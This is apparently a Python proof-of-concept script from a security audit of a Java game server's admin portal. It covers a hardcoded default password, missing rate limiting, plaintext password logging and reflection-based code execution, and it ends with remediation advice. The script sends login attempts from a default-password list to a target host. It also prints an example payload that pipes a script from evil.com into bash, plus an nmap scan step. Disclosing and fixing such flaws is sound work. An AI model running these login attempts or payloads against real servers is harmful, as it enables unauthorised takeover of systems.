#!/usr/bin/env python3
"""
PoC #1: GM Default Password & Arbitrary Code Execution (CRITICAL)

Demonstrates:
  1. GM portal uses a shared hardcoded password (default: "123456789")
  2. No rate limiting on adminLogin
  3. Password is logged in plaintext
  4. After login, GM can execute arbitrary Java Runnable via reflection
  5. GM can hot-swap running classes

Source references:
  - AdminService.java:13  -> password = "123456789"
  - AdminPacketHandler.java:839-870 -> adminLogin (no rate limit, logs password)
  - AdminPacketHandler.java:682-696 -> exec() via Class.forName().newInstance()
  - AdminPacketHandler.java:225-260 -> hotswap() via Instrumentation.redefineClasses()
"""

import socket
import struct
import sys
import time
import argparse

# ---------------------------------------------------------------------------
# Minimal packet helpers (simplified for PoC — real protocol would need
# proper OpCode values and packet framing)
# ---------------------------------------------------------------------------

# These OpCode values are illustrative; real values depend on the game's
# protocol definition. An attacker would extract them from the client.
OPCODE_ADMIN_LOGIN_CLIENT = 0x1001       # illustrative
OPCODE_ADMIN_EXEC_CLIENT  = 0x1002       # illustrative
OPCODE_ADMIN_HOTSWAP_CLIENT = 0x1003     # illustrative

def build_packet(opcode, serial, payload=b""):
    """Build a minimal packet. Real format depends on the game protocol."""
    # Simplified: [opcode:2][serial:4][payload_length:2][payload]
    header = struct.pack(">H", opcode)
    header += struct.pack(">I", serial)
    header += struct.pack(">H", len(payload))
    return header + payload

def build_string(s):
    """Encode a string as length-prefixed UTF-8 (simplified)."""
    data = s.encode("utf-8")
    return struct.pack(">H", len(data)) + data

def build_admin_login(name, password, serial=1):
    """Build an adminLogin packet."""
    payload = build_string(name) + build_string(password)
    return build_packet(OPCODE_ADMIN_LOGIN_CLIENT, serial, payload)

def build_admin_exec(className, serial=2):
    """Build an exec packet to run arbitrary Runnable class."""
    payload = build_string(className)
    return build_packet(OPCODE_ADMIN_EXEC_CLIENT, serial, payload)

def build_admin_hotswap(className, serial=3):
    """Build a hotswap packet to redefine a running class."""
    payload = build_string(className)
    return build_packet(OPCODE_ADMIN_HOTSWAP_CLIENT, serial, payload)


# ---------------------------------------------------------------------------
# Attack demonstration
# ---------------------------------------------------------------------------

DEFAULT_PASSWORDS = [
    "123456789",          # hardcoded default in AdminService.java:13
    "admin",
    "password",
    "gm123",
    "123456",
]

def try_login(host, port, password, name="admin"):
    """Attempt GM login with given password."""
    print(f"  [*] Trying password: '{password}' for user '{name}'")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        packet = build_admin_login(name, password)
        sock.send(packet)
        # In a real attack, parse the response to check success
        response = sock.recv(4096)
        sock.close()
        print(f"  [>] Response received ({len(response)} bytes)")
        return response
    except Exception as e:
        print(f"  [!] Connection failed: {e}")
        return None

def brute_force_login(host, port):
    """Demonstrate brute-force with no rate limiting."""
    print("\n[!] Brute-force GM login (no rate limit exists):")
    print(f"    Target: {host}:{port}")
    for pwd in DEFAULT_PASSWORDS:
        try_login(host, port, pwd)
        # No delay needed — server has no rate limiting
    print("\n[!] Note: Password is also logged in plaintext on server:")
    print('    log.info("[ADMINLOGIN]NAME["+name+"]PASSWORD["+password+"]");')
    print("    -> AdminPacketHandler.java:870")

def arbitrary_code_exec(host, port):
    """Demonstrate arbitrary Runnable execution via reflection."""
    print("\n[!] After GM login, attacker can execute arbitrary Java code:")
    print("    AdminPacketHandler.java:682-696 (exec method):")
    print('    Class clazz = Class.forName(className);')
    print('    Runnable r = (Runnable) clazz.newInstance();')
    print('    r.run();')
    print()
    print("    Example malicious payloads:")
    print('    - Runtime.getRuntime().exec("curl http://evil.com/shell.sh|bash")')
    print('    - Dump entire database')
    print('    - Create backdoor admin accounts')
    print('    - Wipe all player data')

def hotswap_attack(host, port):
    """Demonstrate class hot-swap attack."""
    print("\n[!] After GM login, attacker can hot-swap running classes:")
    print("    AdminPacketHandler.java:225-260 (hotswap method):")
    print("    Loads .class file from ./hotfix/<SimpleName>.class")
    print("    Uses Instrumentation.redefineClasses() to replace at runtime")
    print()
    print("    Attack scenario:")
    print("    1. Upload malicious .class to ./hotfix/ via another vector")
    print("    2. Hot-swap a core game class (e.g., payment handler)")
    print("    3. All new calls use attacker-controlled code")

def main():
    parser = argparse.ArgumentParser(
        description="PoC: GM Default Password & RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python 01_gm_default_password.py --host 192.168.1.100 --port 9000
  python 01_gm_default_password.py --host 127.0.0.1 --port 9000 --demo
        """
    )
    parser.add_argument("--host", default="127.0.0.1", help="GM server host")
    parser.add_argument("--port", type=int, default=9000, help="GM server port")
    parser.add_argument("--demo", action="store_true", help="Run demo without connecting")
    args = parser.parse_args()

    print("=" * 60)
    print("PoC #1: GM Default Password & Arbitrary Code Execution")
    print("=" * 60)
    print()
    print("VULNERABILITY SUMMARY:")
    print("  1. Default password: '123456789' (AdminService.java:13)")
    print("  2. No rate limiting on adminLogin (AdminPacketHandler.java:839)")
    print("  3. Password logged in plaintext (AdminPacketHandler.java:870)")
    print("  4. Arbitrary Runnable via reflection (AdminPacketHandler.java:682)")
    print("  5. Class hot-swap at runtime (AdminPacketHandler.java:225)")
    print()
    print("IMPACT: Full server compromise if GM port is reachable")
    print()

    if args.demo:
        print("[DEMO MODE] Showing attack flow without connecting...")
        print()
        print("Step 1: Discover GM port (often exposed on same IP as game)")
        print(f"  nmap -p 9000-9100 {args.host}")
        print()
        print("Step 2: Login with default password")
        print(f"  -> Send adminLogin packet with password='123456789'")
        print()
        print("Step 3: Execute arbitrary code")
        print("  -> Send exec packet with className='attacker.RCEPayload'")
        print()
        print("Step 4: Hot-swap game logic")
        print("  -> Upload malicious .class to ./hotfix/")
        print("  -> Send hotswap packet with className='peony.game.Server'")
        print()
        print("REMEDIATION:")
        print("  - Require per-account passwords with strong hashing (bcrypt)")
        print("  - Add rate limiting and account lockout")
        print("  - Remove reflection-based exec() entirely")
        print("  - Remove or heavily restrict hotswap()")
        print("  - Never log passwords")
        print("  - Restrict GM port to localhost/VPN only")
    else:
        brute_force_login(args.host, args.port)
        arbitrary_code_exec(args.host, args.port)
        hotswap_attack(args.host, args.port)

if __name__ == "__main__":
    main()